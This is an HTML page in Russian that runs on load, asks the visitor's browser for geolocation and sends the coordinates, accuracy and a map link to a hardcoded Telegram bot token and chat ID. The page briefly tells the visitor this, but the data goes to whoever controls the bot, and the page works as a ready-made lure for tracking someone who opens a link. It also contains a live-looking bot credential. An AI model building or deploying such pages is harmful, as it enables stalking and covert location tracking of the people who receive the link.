<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Авто-отправка геолокации</title>
  <style>
    body{font-family:Arial,sans-serif;padding:20px;background:#f0f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
    .card{background:#fff;padding:20px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.1);text-align:center;max-width:400px;width:90%}
    .status{margin-top:12px;font-size:14px;color:#333}
  </style>
</head>
<body>
  <div class="card">
    <h2>Отправка местоположения в Telegram</h2>
    <p>При открытии страницы браузер запросит разрешение на геолокацию. После подтверждения данные отправятся в Telegram.</p>
    <div id="status" class="status">Ожидание действий...</div>
  </div>

  <script>
    const botToken = "7869917177:AAFugiEYqSDo55XUYa7h7FSLaBkNVnoUA_w";
    const chatId = "6266166994";
    const statusEl = document.getElementById('status');

    function sendLocation(lat, lon, acc) {
      const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
      const message = `Местоположение:\nLatitude: ${lat}\nLongitude: ${lon}\nТочность: ${Math.round(acc)} м\nСсылка: ${mapUrl}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
      
      fetch(url, { method: 'GET', mode: 'cors' })
        .then(res => {
          if(res.ok) statusEl.textContent = "Местоположение успешно отправлено!";
          else statusEl.textContent = `Ошибка отправки: ${res.status}`;
        })
        .catch(err => {
          console.error(err);
          statusEl.textContent = "Ошибка отправки (возможно CORS или сеть).";
        });
    }

    function getLocation() {
      if(!navigator.geolocation){
        statusEl.textContent = "Геолокация не поддерживается браузером.";
        return;
      }
      statusEl.textContent = "Запрашиваем разрешение на геолокацию...";
      navigator.geolocation.getCurrentPosition(
        pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
        err => {
          if(err.code===1) statusEl.textContent = "Доступ к геолокации запрещён пользователем.";
          else if(err.code===2) statusEl.textContent = "Позиция недоступна.";
          else if(err.code===3) statusEl.textContent = "Превышено время ожидания.";
          else statusEl.textContent = "Ошибка геолокации: "+(err.message||err.code);
        },
        { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
      );
    }

    // Автозапуск при открытии страницы
    window.addEventListener('load', getLocation);
  </script>
</body>
</html>